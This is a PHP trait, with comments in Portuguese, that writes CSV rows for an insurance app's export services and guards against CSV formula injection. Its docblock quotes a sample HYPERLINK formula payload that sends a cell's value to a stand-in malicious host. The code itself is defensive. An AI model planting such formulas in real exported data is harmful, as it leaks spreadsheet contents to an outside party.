<?php

namespace App\Services\Exportacoes;

/**
 * Comportamento compartilhado pelos três serviços de exportação.
 *
 * Existe para não repetir a mesma proteção em ExportacaoSegurados,
 * ExportacaoApolice e ExportacaoPagamento — se a regra mudar, muda num
 * lugar só. Um trait (e não herança) porque isso é uma capacidade que os
 * serviços *têm*, não um tipo do qual eles *são* uma especialização: não
 * existe "um ExportacaoPagamento é um EscritorDeCsv" no domínio.
 */
trait EscreveLinhaCsv
{
    /**
     * Escreve uma linha no CSV neutralizando fórmulas (CSV injection).
     *
     * Excel e LibreOffice interpretam como fórmula qualquer célula que
     * comece com = + - @ TAB ou CR. Como `observacoes` é texto livre
     * digitado pelo operador, alguém pode gravar
     * `=HYPERLINK("http://site.mau/?v="&A1,"Clique")` numa observação e o
     * arquivo vira um vetor de ataque assim que outra pessoa abrir o
     * relatório exportado. Prefixar com apóstrofo faz a planilha tratar a
     * célula como texto — o conteúdo continua legível, só não executa.
     */
    protected function escreverLinha($arquivo, array $colunas): void
    {
        // Os 3 últimos argumentos são os padrões do fputcsv, exceto $escape.
        // O PHP 8.4 depreciou omiti-lo porque o padrão vai mudar; passar ''
        // desliga o escape por barra invertida, que nem faz parte do CSV
        // (RFC 4180) e corrompia campos terminados em "\" ao abrir no Excel.
        fputcsv($arquivo, array_map([$this, 'neutralizarFormula'], $colunas), ',', '"', '');
    }

    protected function neutralizarFormula($valor)
    {
        // Números e datas não são texto livre e não disparam fórmula —
        // converter tudo para string quebraria o tipo na planilha.
        if (! is_string($valor) || $valor === '') {
            return $valor;
        }

        return in_array($valor[0], ['=', '+', '-', '@', "\t", "\r"], true)
            ? "'" . $valor
            : $valor;
    }
}
